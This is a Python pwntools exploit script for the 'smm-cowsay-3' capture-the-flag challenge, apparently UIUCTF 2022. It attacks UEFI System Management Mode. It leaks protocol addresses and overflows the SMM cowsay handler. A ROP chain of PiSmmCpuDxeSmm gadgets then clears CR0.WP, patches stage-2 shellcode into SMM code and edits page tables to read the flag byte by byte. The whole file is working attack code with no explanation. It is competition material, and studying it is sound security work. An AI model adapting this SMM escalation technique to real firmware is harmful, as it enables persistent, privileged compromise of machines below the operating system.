#!/usr/bin/env python3
#
# @mebeim - 2022-08-15
#

import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

HOST = 'smm-cowsay-3.chal.uiuc.tf'
PORT = 1337
context(arch='amd64')

def connect(prev_conn=None, quiet=False):
	if quiet:
		prev_log_level = context.log_level
		context.log_level = 'ERROR'

	if prev_conn is not None:
		prev_conn.close()

	if args.REMOTE:
		r = remote(HOST, PORT)
	else:
		os.chdir('handout/run')
		r = process('./run.sh')
		os.chdir('../..')

	if quiet:
		context.log_level = prev_log_level

	return r


gEfiSmmCommunicationProtocolGuid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2
gEfiSmmCowsayCommunicationGuid   = 0xf79265547535a8b54d102c839a75cf12
gEfiSmmConfigurationProtocolGuid = 0xa74bdad78bbef080492eb68926eeb3de
EfiRuntimeServicesData = 6
conn = None

def expl(leak_addr):
	global conn
	log.info('Leaking 8 bytes at 0x%x...', leak_addr)

	conn = connect(conn, quiet=True)
	conn.recvuntil(b'Address of SystemTable: ')
	system_table = int(conn.recvline(), 16)
	# log.info('SystemTable @ 0x%x', system_table)

	code = asm(f'''
	mov rax, {system_table}
	mov rax, qword ptr [rax + 96]  /* SystemTable->BootServices */
	mov rbx, qword ptr [rax + 64]  /* BootServices->AllocatePool */
	mov rcx, qword ptr [rax + 320] /* BootServices->LocateProtocol */
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RBX: 0x')
	AllocatePool = int(conn.recvn(16), 16)
	conn.recvuntil(b'RCX: 0x')
	LocateProtocol = int(conn.recvn(16), 16)

	# log.success('BootServices->AllocatePool   @ 0x%x', AllocatePool)
	# log.success('BootServices->LocateProtocol @ 0x%x', LocateProtocol)

	code = asm(f'''
		/* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &protocol) */
		lea rcx, qword ptr [rip + guid]
		xor rdx, rdx
		lea r8, qword ptr [rip + protocol]
		mov rax, {LocateProtocol}
		call rax

		test rax, rax
		jnz fail

		mov rax, qword ptr [rip + protocol] /* mSmmCommunication */
		mov rbx, qword ptr [rax]            /* mSmmCommunication->Communicate */
		ret

	fail:
		ud2

	guid:
		.octa {gEfiSmmCommunicationProtocolGuid}
	protocol:
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RAX: 0x')
	mSmmCommunication = int(conn.recvn(16), 16)
	conn.recvuntil(b'RBX: 0x')
	Communicate = int(conn.recvn(16), 16)

	# log.success('mSmmCommunication              @ 0x%x', mSmmCommunication)
	# log.success('mSmmCommunication->Communicate @ 0x%x', Communicate)

	code = asm(f'''
		/* AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer) */
		mov rcx, {EfiRuntimeServicesData}
		mov rdx, 0x1000
		lea r8, qword ptr [rip + buffer]
		mov rax, {AllocatePool}
		call rax

		test rax, rax
		jnz fail

		mov rax, qword ptr [rip + buffer]
		ret

	fail:
		ud2

	buffer:
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RAX: 0x')
	buffer = int(conn.recvn(16), 16)
	# log.success('Allocated buffer @ 0x%x', buffer)

	code = asm(f'''
		/* LocateProtocol(gEfiSmmConfigurationProtocolGuid, NULL, &protocol) */
		lea rcx, qword ptr [rip + guid]
		xor rdx, rdx
		lea r8, qword ptr [rip + protocol]
		mov rax, {LocateProtocol}
		call rax

		test rax, rax
		jnz fail

		mov rax, qword ptr [rip + protocol]
		ret

	fail:
		ud2

	guid:
		.octa {gEfiSmmConfigurationProtocolGuid}
	protocol:
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RAX: 0x')
	SmmConfigurationProtocol = int(conn.recvn(16), 16)
	PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - 0x16210
	PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + 0x1000

	# log.success('SmmConfigurationProtocol    @ 0x%x', SmmConfigurationProtocol)
	# log.success('=> PiSmmCpuDxeSmm.efi       @ 0x%x', PiSmmCpuDxeSmm_base)
	# log.success('=> PiSmmCpuDxeSmm.efi .text @ 0x%x', PiSmmCpuDxeSmm_text)

	new_smm_stack   = buffer + 0x800
	ret_0x6d        = PiSmmCpuDxeSmm_base + 0xfc8a  # ret 0x6d
	flip_stack      = PiSmmCpuDxeSmm_base + 0x3c1c  # pop rsp ; ret
	pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + 0xd228  # pop rax ; pop rbx ; pop r12 ; ret
	mov_cr0_rax     = PiSmmCpuDxeSmm_base + 0x10a7d # mov cr0, rax ; wbinvd ; ret
	write_primitive = PiSmmCpuDxeSmm_base + 0x3b8f  # mov qword ptr [rbx], rax ; pop rbx ; ret

	payload  = 'A'.encode('utf-16-le') * 200 + p64(ret_0x6d)

	stage2_shellcode = asm(f'''
		movabs rbx, 0xffffffff000

		/* Walk page table */
		mov rax, cr3
		mov rax, qword ptr [rax]
		and rax, rbx
		mov rax, qword ptr [rax + 8 * 0x1]
		and rax, rbx
		mov rax, qword ptr [rax + 8 * 0x22]
		and rax, rbx
		mov rbx, rax
		mov rax, qword ptr [rax + 8 * 0x40]

		/* Set present bit */
		or al, 1
		mov qword ptr [rbx + 8 * 0x40], rax

		/* Read flag and die so regs get dumped, GG! */
		movabs rax, {leak_addr}
		mov rax, qword ptr [rax]
		ud2
	''')

	real_chain = [
		# Unset CR0.WP
		pop_rax_rbx_r12, # pop rax ; pop rbx ; pop r12 ; ret
		0x80000033     , # -> RAX
		0xdeadbeef     , # filler
		0xdeadbeef     , # filler
		mov_cr0_rax    , # mov cr0, rax ; wbinvd ; ret
	]

	# Now that CR0.WP is unset, we can just patch SMM code and jump to it!
	# Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text
	# 8 bytes at a time, then jump into it
	for i in range(0, len(stage2_shellcode), 8):
		chunk = stage2_shellcode[i:i + 8].ljust(8, b'\x90')
		chunk = u64(chunk)

		real_chain += [
			pop_rax_rbx_r12        , # pop rax ; pop rbx ; pop r12 ; ret
			chunk                  , # -> RAX
			PiSmmCpuDxeSmm_text + i, # -> RBX
			0xdeadbeef             ,
			write_primitive        , # mov qword ptr [rbx], rax ; pop rbx ; ret
			0xdeadbeef
		]

	real_chain += [PiSmmCpuDxeSmm_text]

	# Transform real ROP chain into .quad directives to embed in the shellcode:
	#   .quad 0x7f8a184
	#   .quad 0x80000033
	#    ...
	real_chain_size = len(real_chain) * 8
	real_chain      = '.quad ' + '\n.quad '.join(map(str, real_chain))

	code = asm(f'''
		/* Copy data into allocated buffer */
		lea rsi, qword ptr [rip + data]
		mov rdi, {buffer}
		mov rcx, {0x18 + len(payload)}
		cld
		rep movsb

		/* Copy real ROP chain into buffer + 0x800 */
		lea rsi, qword ptr [rip + real_chain]
		mov rdi, {new_smm_stack}
		mov rcx, {real_chain_size}
		cld
		rep movsb

		/* Communicate(mSmmCommunication, buffer, NULL) */
		mov rcx, {mSmmCommunication}
		mov rdx, {buffer}
		xor r8, r8
		mov rax, {Communicate}

		/* These regs will spill on SMI stack, unaligned. Adjust them so that
		 * we return into a pop rsp; ret and we set RSP to new_stack
		 */
		movabs r13, {(flip_stack << 40) & 0xffffffffffffffff}
		movabs r14, {((flip_stack >> 24) | (new_smm_stack << 40)) & 0xffffffffffffffff}
		movabs r15, {new_smm_stack >> 24}
		call rax

		test rax, rax
		jnz fail
		ret

	fail:
		ud2

	real_chain:
		{real_chain}

	data:
		.octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
		.quad {len(payload)}                   /* Buffer->MessageLength */
		/* payload will be appended here to serve as Buffer->Data */
	''')

	conn.sendline(code.hex().encode() + payload.hex().encode() + b'\ndone')
	conn.recvuntil(b'RAX  - ')
	return p64(int(conn.recvn(16), 16))


flag = ''
for off in range(0, 0x100, 8):
	chunk = expl(0x44440000 + off)
	flag += chunk.decode()
	log.success(flag)

	if '}' in flag:
		break
